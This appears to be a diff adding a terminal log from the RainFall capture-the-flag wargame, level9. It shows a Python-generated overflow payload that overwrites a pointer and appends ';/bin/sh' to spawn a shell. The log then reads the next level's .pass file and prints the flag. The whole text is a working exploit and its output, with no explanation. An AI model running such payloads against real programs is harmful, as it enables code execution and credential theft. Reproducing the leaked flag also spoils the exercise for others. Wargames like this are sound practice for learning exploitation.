@@ -1,0 +1,4 @@
+level9@RainFall:~$ ./level9 $(python -c "print 'AAAA\x60\x60\xd8\xb7'+'A'*100 + '\x10\xa0\x04\x08;/bin/sh'")
+sh: 1: : not found
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
